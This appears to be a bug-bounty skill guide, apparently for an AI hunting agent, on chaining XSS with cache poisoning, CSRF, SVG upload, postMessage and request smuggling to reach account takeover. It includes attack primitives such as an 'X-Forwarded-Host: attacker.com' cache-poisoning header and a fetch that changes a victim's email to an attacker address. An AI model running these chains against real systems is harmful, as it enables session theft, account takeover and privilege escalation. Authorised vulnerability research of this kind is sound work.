XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"*; and the answer is always something beyond `alert(1)`.
### Chain 1: Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)
- **B.** Identify an unkeyed input that influences the cached body; typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
### Chain 2: Self-XSS + CSRF Trigger → Effective Stored XSS → ATO
- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`); payload only executes when the same logged-in user views their own profile.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session; extract cookie, force email change via XHR, password reset → full ATO.
### Chain 3: DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO
- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page; typically `document.location.hash` parsed into the DOM without escaping.
### Chain 4: SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft
- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags; many sanitisers process PNG/JPG but pass SVG through unmodified.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector; bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
### Chain 5: postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO
- **Impact:** Cross-origin JS execution and exfil with no CSP violation; `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
### Chain 6: Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS
- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply); payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **C.** Privileged viewer's session executes the payload in their authenticated context; XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS; attacker promotes themselves on the privileged user's behalf.
- `hunt-cache-poison`; Chain 1
- `hunt-csrf`; Chain 2
- `hunt-oauth`; Chains 3, 5
- `hunt-file-upload` / `hunt-xxe`; Chain 4
- `hunt-ato`; terminal impact for Chains 2, 3, 4, 5
- **`hunt-cache-poison`**; Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`hunt-csrf`**; Same-origin XSS may make authenticated requests despite SameSite cookie restrictions; email/credential changes can still require reauthentication or confirmation for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`hunt-http-smuggling`**; Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`**; Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
- **`triage-validation`**; Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body; those are the two most common downgrade-to-N/A traps.